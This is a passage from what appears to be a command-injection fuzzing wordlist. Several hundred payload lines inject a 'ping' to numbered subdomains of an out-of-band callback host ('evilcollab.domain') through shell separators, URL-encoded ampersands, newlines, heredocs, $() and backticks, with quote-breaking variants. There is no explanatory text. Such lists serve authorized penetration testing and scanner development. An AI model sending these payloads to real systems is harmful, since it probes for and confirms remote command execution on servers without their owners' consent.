+1;ping  x847.lookup.evilcollab.domain;1
+foo;ping  x848.lookup.evilcollab.domain;1
+invvvvv212.org";ping  x849.lookup.evilcollab.domain;1"
+invvvvv212.org';ping  x850.lookup.evilcollab.domain;1'
+1";ping  x851.lookup.evilcollab.domain;1"
+1';ping  x852.lookup.evilcollab.domain;1'
+foo";ping  x853.lookup.evilcollab.domain;1"
+foo';ping  x854.lookup.evilcollab.domain;1'
+invvvvv212.org;ping  x855.lookup.evilcollab.domain;foo
+1;ping  x856.lookup.evilcollab.domain;foo
+foo;ping  x857.lookup.evilcollab.domain;foo
+invvvvv212.org";ping  x858.lookup.evilcollab.domain;foo"
+invvvvv212.org';ping  x859.lookup.evilcollab.domain;foo'
+1";ping  x860.lookup.evilcollab.domain;foo"
+1';ping  x861.lookup.evilcollab.domain;foo'
+foo";ping  x862.lookup.evilcollab.domain;foo"
+foo';ping  x863.lookup.evilcollab.domain;foo'
+invvvvv212.org%26ping  x864.lookup.evilcollab.domain%26invvvvv212.org
+1%26ping  x865.lookup.evilcollab.domain%26invvvvv212.org
+foo%26ping  x866.lookup.evilcollab.domain%26invvvvv212.org
+invvvvv212.org"%26ping  x867.lookup.evilcollab.domain%26invvvvv212.org"
+invvvvv212.org'%26ping  x868.lookup.evilcollab.domain%26invvvvv212.org'
+1"%26ping  x869.lookup.evilcollab.domain%26invvvvv212.org"
+1'%26ping  x870.lookup.evilcollab.domain%26invvvvv212.org'
+foo"%26ping  x871.lookup.evilcollab.domain%26invvvvv212.org"
+foo'%26ping  x872.lookup.evilcollab.domain%26invvvvv212.org'
+invvvvv212.org%26ping  x873.lookup.evilcollab.domain%261
+1%26ping  x874.lookup.evilcollab.domain%261
+foo%26ping  x875.lookup.evilcollab.domain%261
+invvvvv212.org"%26ping  x876.lookup.evilcollab.domain%261"
+invvvvv212.org'%26ping  x877.lookup.evilcollab.domain%261'
+1"%26ping  x878.lookup.evilcollab.domain%261"
+1'%26ping  x879.lookup.evilcollab.domain%261'
+foo"%26ping  x880.lookup.evilcollab.domain%261"
+foo'%26ping  x881.lookup.evilcollab.domain%261'
+invvvvv212.org%26ping  x882.lookup.evilcollab.domain%26foo
+1%26ping  x883.lookup.evilcollab.domain%26foo
+foo%26ping  x884.lookup.evilcollab.domain%26foo
+invvvvv212.org"%26ping  x885.lookup.evilcollab.domain%26foo"
+invvvvv212.org'%26ping  x886.lookup.evilcollab.domain%26foo'
+1"%26ping  x887.lookup.evilcollab.domain%26foo"
+1'%26ping  x888.lookup.evilcollab.domain%26foo'
+foo"%26ping  x889.lookup.evilcollab.domain%26foo"
+foo'%26ping  x890.lookup.evilcollab.domain%26foo'
+invvvvv212.org|ping  x891.lookup.evilcollab.domain|invvvvv212.org
+1|ping  x892.lookup.evilcollab.domain|invvvvv212.org
+foo|ping  x893.lookup.evilcollab.domain|invvvvv212.org
+invvvvv212.org"|ping  x894.lookup.evilcollab.domain|invvvvv212.org"
+invvvvv212.org'|ping  x895.lookup.evilcollab.domain|invvvvv212.org'
+1"|ping  x896.lookup.evilcollab.domain|invvvvv212.org"
+1'|ping  x897.lookup.evilcollab.domain|invvvvv212.org'
+foo"|ping  x898.lookup.evilcollab.domain|invvvvv212.org"
+foo'|ping  x899.lookup.evilcollab.domain|invvvvv212.org'
+invvvvv212.org|ping  x900.lookup.evilcollab.domain|1
+1|ping  x901.lookup.evilcollab.domain|1
+foo|ping  x902.lookup.evilcollab.domain|1
+invvvvv212.org"|ping  x903.lookup.evilcollab.domain|1"
+invvvvv212.org'|ping  x904.lookup.evilcollab.domain|1'
+1"|ping  x905.lookup.evilcollab.domain|1"
+1'|ping  x906.lookup.evilcollab.domain|1'
+foo"|ping  x907.lookup.evilcollab.domain|1"
+foo'|ping  x908.lookup.evilcollab.domain|1'
+invvvvv212.org|ping  x909.lookup.evilcollab.domain|foo
+1|ping  x910.lookup.evilcollab.domain|foo
+foo|ping  x911.lookup.evilcollab.domain|foo
+invvvvv212.org"|ping  x912.lookup.evilcollab.domain|foo"
+invvvvv212.org'|ping  x913.lookup.evilcollab.domain|foo'
+1"|ping  x914.lookup.evilcollab.domain|foo"
+1'|ping  x915.lookup.evilcollab.domain|foo'
+foo"|ping  x916.lookup.evilcollab.domain|foo"
+foo'|ping  x917.lookup.evilcollab.domain|foo'
+invvvvv212.org<<D%0aD%0aping  x918.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0aping  x919.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0aping  x920.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0aping  x921.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0aping  x922.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0aping  x923.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0aping  x924.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0aping  x925.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0aping  x926.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0aping  x927.lookup.evilcollab.domain<<D%0aD%0a1
+1<<D%0aD%0aping  x928.lookup.evilcollab.domain<<D%0aD%0a1
+foo<<D%0aD%0aping  x929.lookup.evilcollab.domain<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0aping  x930.lookup.evilcollab.domain<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0aping  x931.lookup.evilcollab.domain<<D%0aD%0a1'
+1"<<D%0aD%0aping  x932.lookup.evilcollab.domain<<D%0aD%0a1"
+1'<<D%0aD%0aping  x933.lookup.evilcollab.domain<<D%0aD%0a1'
+foo"<<D%0aD%0aping  x934.lookup.evilcollab.domain<<D%0aD%0a1"
+foo'<<D%0aD%0aping  x935.lookup.evilcollab.domain<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0aping  x936.lookup.evilcollab.domain<<D%0aD%0afoo
+1<<D%0aD%0aping  x937.lookup.evilcollab.domain<<D%0aD%0afoo
+foo<<D%0aD%0aping  x938.lookup.evilcollab.domain<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0aping  x939.lookup.evilcollab.domain<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0aping  x940.lookup.evilcollab.domain<<D%0aD%0afoo'
+1"<<D%0aD%0aping  x941.lookup.evilcollab.domain<<D%0aD%0afoo"
+1'<<D%0aD%0aping  x942.lookup.evilcollab.domain<<D%0aD%0afoo'
+foo"<<D%0aD%0aping  x943.lookup.evilcollab.domain<<D%0aD%0afoo"
+foo'<<D%0aD%0aping  x944.lookup.evilcollab.domain<<D%0aD%0afoo'
+invvvvv212.org%0a%0a$(ping  x945.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+1%0a%0a$(ping  x946.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+foo%0a%0a$(ping  x947.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a$(ping  x948.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a$(ping  x949.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+1"%0a%0a$(ping  x950.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+1'%0a%0a$(ping  x951.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+foo"%0a%0a$(ping  x952.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+foo'%0a%0a$(ping  x953.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a$(ping  x954.lookup.evilcollab.domain)%0a%0a1
+1%0a%0a$(ping  x955.lookup.evilcollab.domain)%0a%0a1
+foo%0a%0a$(ping  x956.lookup.evilcollab.domain)%0a%0a1
+invvvvv212.org"%0a%0a$(ping  x957.lookup.evilcollab.domain)%0a%0a1"
+invvvvv212.org'%0a%0a$(ping  x958.lookup.evilcollab.domain)%0a%0a1'
+1"%0a%0a$(ping  x959.lookup.evilcollab.domain)%0a%0a1"
+1'%0a%0a$(ping  x960.lookup.evilcollab.domain)%0a%0a1'
+foo"%0a%0a$(ping  x961.lookup.evilcollab.domain)%0a%0a1"
+foo'%0a%0a$(ping  x962.lookup.evilcollab.domain)%0a%0a1'
+invvvvv212.org%0a%0a$(ping  x963.lookup.evilcollab.domain)%0a%0afoo
+1%0a%0a$(ping  x964.lookup.evilcollab.domain)%0a%0afoo
+foo%0a%0a$(ping  x965.lookup.evilcollab.domain)%0a%0afoo
+invvvvv212.org"%0a%0a$(ping  x966.lookup.evilcollab.domain)%0a%0afoo"
+invvvvv212.org'%0a%0a$(ping  x967.lookup.evilcollab.domain)%0a%0afoo'
+1"%0a%0a$(ping  x968.lookup.evilcollab.domain)%0a%0afoo"
+1'%0a%0a$(ping  x969.lookup.evilcollab.domain)%0a%0afoo'
+foo"%0a%0a$(ping  x970.lookup.evilcollab.domain)%0a%0afoo"
+foo'%0a%0a$(ping  x971.lookup.evilcollab.domain)%0a%0afoo'
+invvvvv212.org%0d%0d$(ping  x972.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+1%0d%0d$(ping  x973.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+foo%0d%0d$(ping  x974.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d$(ping  x975.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d$(ping  x976.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+1"%0d%0d$(ping  x977.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+1'%0d%0d$(ping  x978.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+foo"%0d%0d$(ping  x979.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+foo'%0d%0d$(ping  x980.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d$(ping  x981.lookup.evilcollab.domain)%0d%0d1
+1%0d%0d$(ping  x982.lookup.evilcollab.domain)%0d%0d1
+foo%0d%0d$(ping  x983.lookup.evilcollab.domain)%0d%0d1
+invvvvv212.org"%0d%0d$(ping  x984.lookup.evilcollab.domain)%0d%0d1"
+invvvvv212.org'%0d%0d$(ping  x985.lookup.evilcollab.domain)%0d%0d1'
+1"%0d%0d$(ping  x986.lookup.evilcollab.domain)%0d%0d1"
+1'%0d%0d$(ping  x987.lookup.evilcollab.domain)%0d%0d1'
+foo"%0d%0d$(ping  x988.lookup.evilcollab.domain)%0d%0d1"
+foo'%0d%0d$(ping  x989.lookup.evilcollab.domain)%0d%0d1'
+invvvvv212.org%0d%0d$(ping  x990.lookup.evilcollab.domain)%0d%0dfoo
+1%0d%0d$(ping  x991.lookup.evilcollab.domain)%0d%0dfoo
+foo%0d%0d$(ping  x992.lookup.evilcollab.domain)%0d%0dfoo
+invvvvv212.org"%0d%0d$(ping  x993.lookup.evilcollab.domain)%0d%0dfoo"
+invvvvv212.org'%0d%0d$(ping  x994.lookup.evilcollab.domain)%0d%0dfoo'
+1"%0d%0d$(ping  x995.lookup.evilcollab.domain)%0d%0dfoo"
+1'%0d%0d$(ping  x996.lookup.evilcollab.domain)%0d%0dfoo'
+foo"%0d%0d$(ping  x997.lookup.evilcollab.domain)%0d%0dfoo"
+foo'%0d%0d$(ping  x998.lookup.evilcollab.domain)%0d%0dfoo'
+invvvvv212.org;$(ping  x999.lookup.evilcollab.domain);invvvvv212.org
+1;$(ping  x1000.lookup.evilcollab.domain);invvvvv212.org
+foo;$(ping  x1001.lookup.evilcollab.domain);invvvvv212.org
+invvvvv212.org";$(ping  x1002.lookup.evilcollab.domain);invvvvv212.org"
+invvvvv212.org';$(ping  x1003.lookup.evilcollab.domain);invvvvv212.org'
+1";$(ping  x1004.lookup.evilcollab.domain);invvvvv212.org"
+1';$(ping  x1005.lookup.evilcollab.domain);invvvvv212.org'
+foo";$(ping  x1006.lookup.evilcollab.domain);invvvvv212.org"
+foo';$(ping  x1007.lookup.evilcollab.domain);invvvvv212.org'
+invvvvv212.org;$(ping  x1008.lookup.evilcollab.domain);1
+1;$(ping  x1009.lookup.evilcollab.domain);1
+foo;$(ping  x1010.lookup.evilcollab.domain);1
+invvvvv212.org";$(ping  x1011.lookup.evilcollab.domain);1"
+invvvvv212.org';$(ping  x1012.lookup.evilcollab.domain);1'
+1";$(ping  x1013.lookup.evilcollab.domain);1"
+1';$(ping  x1014.lookup.evilcollab.domain);1'
+foo";$(ping  x1015.lookup.evilcollab.domain);1"
+foo';$(ping  x1016.lookup.evilcollab.domain);1'
+invvvvv212.org;$(ping  x1017.lookup.evilcollab.domain);foo
+1;$(ping  x1018.lookup.evilcollab.domain);foo
+foo;$(ping  x1019.lookup.evilcollab.domain);foo
+invvvvv212.org";$(ping  x1020.lookup.evilcollab.domain);foo"
+invvvvv212.org';$(ping  x1021.lookup.evilcollab.domain);foo'
+1";$(ping  x1022.lookup.evilcollab.domain);foo"
+1';$(ping  x1023.lookup.evilcollab.domain);foo'
+foo";$(ping  x1024.lookup.evilcollab.domain);foo"
+foo';$(ping  x1025.lookup.evilcollab.domain);foo'
+invvvvv212.org%26$(ping  x1026.lookup.evilcollab.domain)%26invvvvv212.org
+1%26$(ping  x1027.lookup.evilcollab.domain)%26invvvvv212.org
+foo%26$(ping  x1028.lookup.evilcollab.domain)%26invvvvv212.org
+invvvvv212.org"%26$(ping  x1029.lookup.evilcollab.domain)%26invvvvv212.org"
+invvvvv212.org'%26$(ping  x1030.lookup.evilcollab.domain)%26invvvvv212.org'
+1"%26$(ping  x1031.lookup.evilcollab.domain)%26invvvvv212.org"
+1'%26$(ping  x1032.lookup.evilcollab.domain)%26invvvvv212.org'
+foo"%26$(ping  x1033.lookup.evilcollab.domain)%26invvvvv212.org"
+foo'%26$(ping  x1034.lookup.evilcollab.domain)%26invvvvv212.org'
+invvvvv212.org%26$(ping  x1035.lookup.evilcollab.domain)%261
+1%26$(ping  x1036.lookup.evilcollab.domain)%261
+foo%26$(ping  x1037.lookup.evilcollab.domain)%261
+invvvvv212.org"%26$(ping  x1038.lookup.evilcollab.domain)%261"
+invvvvv212.org'%26$(ping  x1039.lookup.evilcollab.domain)%261'
+1"%26$(ping  x1040.lookup.evilcollab.domain)%261"
+1'%26$(ping  x1041.lookup.evilcollab.domain)%261'
+foo"%26$(ping  x1042.lookup.evilcollab.domain)%261"
+foo'%26$(ping  x1043.lookup.evilcollab.domain)%261'
+invvvvv212.org%26$(ping  x1044.lookup.evilcollab.domain)%26foo
+1%26$(ping  x1045.lookup.evilcollab.domain)%26foo
+foo%26$(ping  x1046.lookup.evilcollab.domain)%26foo
+invvvvv212.org"%26$(ping  x1047.lookup.evilcollab.domain)%26foo"
+invvvvv212.org'%26$(ping  x1048.lookup.evilcollab.domain)%26foo'
+1"%26$(ping  x1049.lookup.evilcollab.domain)%26foo"
+1'%26$(ping  x1050.lookup.evilcollab.domain)%26foo'
+foo"%26$(ping  x1051.lookup.evilcollab.domain)%26foo"
+foo'%26$(ping  x1052.lookup.evilcollab.domain)%26foo'
+invvvvv212.org|$(ping  x1053.lookup.evilcollab.domain)|invvvvv212.org
+1|$(ping  x1054.lookup.evilcollab.domain)|invvvvv212.org
+foo|$(ping  x1055.lookup.evilcollab.domain)|invvvvv212.org
+invvvvv212.org"|$(ping  x1056.lookup.evilcollab.domain)|invvvvv212.org"
+invvvvv212.org'|$(ping  x1057.lookup.evilcollab.domain)|invvvvv212.org'
+1"|$(ping  x1058.lookup.evilcollab.domain)|invvvvv212.org"
+1'|$(ping  x1059.lookup.evilcollab.domain)|invvvvv212.org'
+foo"|$(ping  x1060.lookup.evilcollab.domain)|invvvvv212.org"
+foo'|$(ping  x1061.lookup.evilcollab.domain)|invvvvv212.org'
+invvvvv212.org|$(ping  x1062.lookup.evilcollab.domain)|1
+1|$(ping  x1063.lookup.evilcollab.domain)|1
+foo|$(ping  x1064.lookup.evilcollab.domain)|1
+invvvvv212.org"|$(ping  x1065.lookup.evilcollab.domain)|1"
+invvvvv212.org'|$(ping  x1066.lookup.evilcollab.domain)|1'
+1"|$(ping  x1067.lookup.evilcollab.domain)|1"
+1'|$(ping  x1068.lookup.evilcollab.domain)|1'
+foo"|$(ping  x1069.lookup.evilcollab.domain)|1"
+foo'|$(ping  x1070.lookup.evilcollab.domain)|1'
+invvvvv212.org|$(ping  x1071.lookup.evilcollab.domain)|foo
+1|$(ping  x1072.lookup.evilcollab.domain)|foo
+foo|$(ping  x1073.lookup.evilcollab.domain)|foo
+invvvvv212.org"|$(ping  x1074.lookup.evilcollab.domain)|foo"
+invvvvv212.org'|$(ping  x1075.lookup.evilcollab.domain)|foo'
+1"|$(ping  x1076.lookup.evilcollab.domain)|foo"
+1'|$(ping  x1077.lookup.evilcollab.domain)|foo'
+foo"|$(ping  x1078.lookup.evilcollab.domain)|foo"
+foo'|$(ping  x1079.lookup.evilcollab.domain)|foo'
+invvvvv212.org<<D%0aD%0a$(ping  x1080.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a$(ping  x1081.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a$(ping  x1082.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a$(ping  x1083.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a$(ping  x1084.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a$(ping  x1085.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a$(ping  x1086.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a$(ping  x1087.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a$(ping  x1088.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a$(ping  x1089.lookup.evilcollab.domain)<<D%0aD%0a1
+1<<D%0aD%0a$(ping  x1090.lookup.evilcollab.domain)<<D%0aD%0a1
+foo<<D%0aD%0a$(ping  x1091.lookup.evilcollab.domain)<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a$(ping  x1092.lookup.evilcollab.domain)<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a$(ping  x1093.lookup.evilcollab.domain)<<D%0aD%0a1'
+1"<<D%0aD%0a$(ping  x1094.lookup.evilcollab.domain)<<D%0aD%0a1"
+1'<<D%0aD%0a$(ping  x1095.lookup.evilcollab.domain)<<D%0aD%0a1'
+foo"<<D%0aD%0a$(ping  x1096.lookup.evilcollab.domain)<<D%0aD%0a1"
+foo'<<D%0aD%0a$(ping  x1097.lookup.evilcollab.domain)<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a$(ping  x1098.lookup.evilcollab.domain)<<D%0aD%0afoo
+1<<D%0aD%0a$(ping  x1099.lookup.evilcollab.domain)<<D%0aD%0afoo
+foo<<D%0aD%0a$(ping  x1100.lookup.evilcollab.domain)<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a$(ping  x1101.lookup.evilcollab.domain)<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a$(ping  x1102.lookup.evilcollab.domain)<<D%0aD%0afoo'
+1"<<D%0aD%0a$(ping  x1103.lookup.evilcollab.domain)<<D%0aD%0afoo"
+1'<<D%0aD%0a$(ping  x1104.lookup.evilcollab.domain)<<D%0aD%0afoo'
+foo"<<D%0aD%0a$(ping  x1105.lookup.evilcollab.domain)<<D%0aD%0afoo"
+foo'<<D%0aD%0a$(ping  x1106.lookup.evilcollab.domain)<<D%0aD%0afoo'
+invvvvv212.org%0a%0a`ping  x1107.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+1%0a%0a`ping  x1108.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+foo%0a%0a`ping  x1109.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a`ping  x1110.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a`ping  x1111.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+1"%0a%0a`ping  x1112.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+1'%0a%0a`ping  x1113.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+foo"%0a%0a`ping  x1114.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+foo'%0a%0a`ping  x1115.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a`ping  x1116.lookup.evilcollab.domain`%0a%0a1
+1%0a%0a`ping  x1117.lookup.evilcollab.domain`%0a%0a1
+foo%0a%0a`ping  x1118.lookup.evilcollab.domain`%0a%0a1
+invvvvv212.org"%0a%0a`ping  x1119.lookup.evilcollab.domain`%0a%0a1"
+invvvvv212.org'%0a%0a`ping  x1120.lookup.evilcollab.domain`%0a%0a1'
+1"%0a%0a`ping  x1121.lookup.evilcollab.domain`%0a%0a1"
+1'%0a%0a`ping  x1122.lookup.evilcollab.domain`%0a%0a1'
+foo"%0a%0a`ping  x1123.lookup.evilcollab.domain`%0a%0a1"
+foo'%0a%0a`ping  x1124.lookup.evilcollab.domain`%0a%0a1'
+invvvvv212.org%0a%0a`ping  x1125.lookup.evilcollab.domain`%0a%0afoo
+1%0a%0a`ping  x1126.lookup.evilcollab.domain`%0a%0afoo
+foo%0a%0a`ping  x1127.lookup.evilcollab.domain`%0a%0afoo
+invvvvv212.org"%0a%0a`ping  x1128.lookup.evilcollab.domain`%0a%0afoo"
+invvvvv212.org'%0a%0a`ping  x1129.lookup.evilcollab.domain`%0a%0afoo'
+1"%0a%0a`ping  x1130.lookup.evilcollab.domain`%0a%0afoo"
+1'%0a%0a`ping  x1131.lookup.evilcollab.domain`%0a%0afoo'
+foo"%0a%0a`ping  x1132.lookup.evilcollab.domain`%0a%0afoo"
+foo'%0a%0a`ping  x1133.lookup.evilcollab.domain`%0a%0afoo'
+invvvvv212.org%0d%0d`ping  x1134.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+1%0d%0d`ping  x1135.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+foo%0d%0d`ping  x1136.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d`ping  x1137.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d`ping  x1138.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+1"%0d%0d`ping  x1139.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+1'%0d%0d`ping  x1140.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+foo"%0d%0d`ping  x1141.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+foo'%0d%0d`ping  x1142.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d`ping  x1143.lookup.evilcollab.domain`%0d%0d1
+1%0d%0d`ping  x1144.lookup.evilcollab.domain`%0d%0d1
+foo%0d%0d`ping  x1145.lookup.evilcollab.domain`%0d%0d1
+invvvvv212.org"%0d%0d`ping  x1146.lookup.evilcollab.domain`%0d%0d1"
+invvvvv212.org'%0d%0d`ping  x1147.lookup.evilcollab.domain`%0d%0d1'
+1"%0d%0d`ping  x1148.lookup.evilcollab.domain`%0d%0d1"
+1'%0d%0d`ping  x1149.lookup.evilcollab.domain`%0d%0d1'
+foo"%0d%0d`ping  x1150.lookup.evilcollab.domain`%0d%0d1"
+foo'%0d%0d`ping  x1151.lookup.evilcollab.domain`%0d%0d1'
+invvvvv212.org%0d%0d`ping  x1152.lookup.evilcollab.domain`%0d%0dfoo
+1%0d%0d`ping  x1153.lookup.evilcollab.domain`%0d%0dfoo
+foo%0d%0d`ping  x1154.lookup.evilcollab.domain`%0d%0dfoo
+invvvvv212.org"%0d%0d`ping  x1155.lookup.evilcollab.domain`%0d%0dfoo"
+invvvvv212.org'%0d%0d`ping  x1156.lookup.evilcollab.domain`%0d%0dfoo'
+1"%0d%0d`ping  x1157.lookup.evilcollab.domain`%0d%0dfoo"
+1'%0d%0d`ping  x1158.lookup.evilcollab.domain`%0d%0dfoo'
+foo"%0d%0d`ping  x1159.lookup.evilcollab.domain`%0d%0dfoo"
+foo'%0d%0d`ping  x1160.lookup.evilcollab.domain`%0d%0dfoo'
+invvvvv212.org;`ping  x1161.lookup.evilcollab.domain`;invvvvv212.org
+1;`ping  x1162.lookup.evilcollab.domain`;invvvvv212.org
+foo;`ping  x1163.lookup.evilcollab.domain`;invvvvv212.org
+invvvvv212.org";`ping  x1164.lookup.evilcollab.domain`;invvvvv212.org"
+invvvvv212.org';`ping  x1165.lookup.evilcollab.domain`;invvvvv212.org'
+1";`ping  x1166.lookup.evilcollab.domain`;invvvvv212.org"
+1';`ping  x1167.lookup.evilcollab.domain`;invvvvv212.org'
+foo";`ping  x1168.lookup.evilcollab.domain`;invvvvv212.org"
+foo';`ping  x1169.lookup.evilcollab.domain`;invvvvv212.org'
+invvvvv212.org;`ping  x1170.lookup.evilcollab.domain`;1
+1;`ping  x1171.lookup.evilcollab.domain`;1
+foo;`ping  x1172.lookup.evilcollab.domain`;1
+invvvvv212.org";`ping  x1173.lookup.evilcollab.domain`;1"
+invvvvv212.org';`ping  x1174.lookup.evilcollab.domain`;1'
+1";`ping  x1175.lookup.evilcollab.domain`;1"
+1';`ping  x1176.lookup.evilcollab.domain`;1'
+foo";`ping  x1177.lookup.evilcollab.domain`;1"
+foo';`ping  x1178.lookup.evilcollab.domain`;1'
+invvvvv212.org;`ping  x1179.lookup.evilcollab.domain`;foo
+1;`ping  x1180.lookup.evilcollab.domain`;foo
+foo;`ping  x1181.lookup.evilcollab.domain`;foo
+invvvvv212.org";`ping  x1182.lookup.evilcollab.domain`;foo"
+invvvvv212.org';`ping  x1183.lookup.evilcollab.domain`;foo'
+1";`ping  x1184.lookup.evilcollab.domain`;foo"
+1';`ping  x1185.lookup.evilcollab.domain`;foo'
+foo";`ping  x1186.lookup.evilcollab.domain`;foo"
+foo';`ping  x1187.lookup.evilcollab.domain`;foo'
+invvvvv212.org%26`ping  x1188.lookup.evilcollab.domain`%26invvvvv212.org
+1%26`ping  x1189.lookup.evilcollab.domain`%26invvvvv212.org
+foo%26`ping  x1190.lookup.evilcollab.domain`%26invvvvv212.org
+invvvvv212.org"%26`ping  x1191.lookup.evilcollab.domain`%26invvvvv212.org"
+invvvvv212.org'%26`ping  x1192.lookup.evilcollab.domain`%26invvvvv212.org'
+1"%26`ping  x1193.lookup.evilcollab.domain`%26invvvvv212.org"
+1'%26`ping  x1194.lookup.evilcollab.domain`%26invvvvv212.org'
+foo"%26`ping  x1195.lookup.evilcollab.domain`%26invvvvv212.org"
+foo'%26`ping  x1196.lookup.evilcollab.domain`%26invvvvv212.org'
+invvvvv212.org%26`ping  x1197.lookup.evilcollab.domain`%261
+1%26`ping  x1198.lookup.evilcollab.domain`%261
+foo%26`ping  x1199.lookup.evilcollab.domain`%261
+invvvvv212.org"%26`ping  x1200.lookup.evilcollab.domain`%261"
+invvvvv212.org'%26`ping  x1201.lookup.evilcollab.domain`%261'
+1"%26`ping  x1202.lookup.evilcollab.domain`%261"
+1'%26`ping  x1203.lookup.evilcollab.domain`%261'
+foo"%26`ping  x1204.lookup.evilcollab.domain`%261"
+foo'%26`ping  x1205.lookup.evilcollab.domain`%261'
+invvvvv212.org%26`ping  x1206.lookup.evilcollab.domain`%26foo
+1%26`ping  x1207.lookup.evilcollab.domain`%26foo
+foo%26`ping  x1208.lookup.evilcollab.domain`%26foo
+invvvvv212.org"%26`ping  x1209.lookup.evilcollab.domain`%26foo"
+invvvvv212.org'%26`ping  x1210.lookup.evilcollab.domain`%26foo'
+1"%26`ping  x1211.lookup.evilcollab.domain`%26foo"
+1'%26`ping  x1212.lookup.evilcollab.domain`%26foo'
+foo"%26`ping  x1213.lookup.evilcollab.domain`%26foo"
+foo'%26`ping  x1214.lookup.evilcollab.domain`%26foo'
+invvvvv212.org|`ping  x1215.lookup.evilcollab.domain`|invvvvv212.org
+1|`ping  x1216.lookup.evilcollab.domain`|invvvvv212.org
+foo|`ping  x1217.lookup.evilcollab.domain`|invvvvv212.org
+invvvvv212.org"|`ping  x1218.lookup.evilcollab.domain`|invvvvv212.org"
+invvvvv212.org'|`ping  x1219.lookup.evilcollab.domain`|invvvvv212.org'
+1"|`ping  x1220.lookup.evilcollab.domain`|invvvvv212.org"
+1'|`ping  x1221.lookup.evilcollab.domain`|invvvvv212.org'
+foo"|`ping  x1222.lookup.evilcollab.domain`|invvvvv212.org"
+foo'|`ping  x1223.lookup.evilcollab.domain`|invvvvv212.org'
+invvvvv212.org|`ping  x1224.lookup.evilcollab.domain`|1
+1|`ping  x1225.lookup.evilcollab.domain`|1
+foo|`ping  x1226.lookup.evilcollab.domain`|1
+invvvvv212.org"|`ping  x1227.lookup.evilcollab.domain`|1"
+invvvvv212.org'|`ping  x1228.lookup.evilcollab.domain`|1'
+1"|`ping  x1229.lookup.evilcollab.domain`|1"
+1'|`ping  x1230.lookup.evilcollab.domain`|1'
+foo"|`ping  x1231.lookup.evilcollab.domain`|1"
+foo'|`ping  x1232.lookup.evilcollab.domain`|1'
+invvvvv212.org|`ping  x1233.lookup.evilcollab.domain`|foo
